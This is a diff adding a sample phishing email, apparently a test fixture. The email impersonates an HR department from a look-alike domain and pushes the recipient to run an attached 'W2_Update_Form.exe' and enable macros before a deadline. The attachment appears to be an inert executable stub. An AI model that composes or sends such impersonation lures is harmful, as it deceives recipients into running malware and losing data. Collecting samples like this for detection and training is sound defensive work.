@@ -1,0 +1,34 @@
+From: "HR Department" <hr@company-secure.ga>
+To: attorney@lawfirm.com
+Subject: Updated W-2 Form for Tax Filing - Action Required
+Date: Mon, 25 Nov 2024 10:45:00 +0800
+Message-ID: <tax.001@company-secure.ga>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="boundary-456"
+
+--boundary-456
+Content-Type: text/plain; charset="UTF-8"
+
+Dear Employee,
+
+Per IRS requirements, we need to update your W-2 information for the 2024 tax filing season.
+
+Please download and execute the attached form to update your tax records. This form will automatically connect to our secure payroll system.
+
+IMPORTANT: Make sure to enable macros when prompted to ensure proper functionality.
+
+The form must be completed by Friday to avoid penalties.
+
+HR Department
+hr@company-secure.ga
+
+--boundary-456
+Content-Type: application/octet-stream; name="W2_Update_Form.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="W2_Update_Form.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAA==
+
+--boundary-456--
